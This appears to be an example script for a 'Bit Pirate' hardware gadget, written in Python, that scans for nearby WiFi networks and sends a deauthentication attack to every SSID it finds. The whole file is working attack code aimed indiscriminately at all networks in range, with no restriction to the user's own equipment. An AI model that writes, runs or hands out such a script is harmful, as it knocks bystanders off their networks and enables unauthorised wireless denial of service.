# 
# Scan and send deauth to all WiFi networks found
#

from bitpirate import BitPirate
from bitpirate import Helper

# Search and connect to the Bit Pirate
bp = BitPirate.auto_connect()

# Initialize the Bit Pirate
bp.start()

# Change to WiFi mode
bp.change_mode("wifi")

# Scan WiFi networks and get results
bp.send("scan")
print("Scanning WiFi networks, it may take few seconds...")
bp.wait(10)

# Extract SSIDs from results
results = bp.receive(skip=2) # Skip the first two lines (echo and header)
ssids = Helper.extractSsidsFromList(results)
print("Found SSIDs: ", ssids)

# Deauth each SSID
for ssid in ssids:
    bp.send(f"deauth {ssid}")
    bp.wait(3)
    response = bp.receive_all(3)
    for line in response:
        print(" - " + line)

# Close the connection
bp.stop()
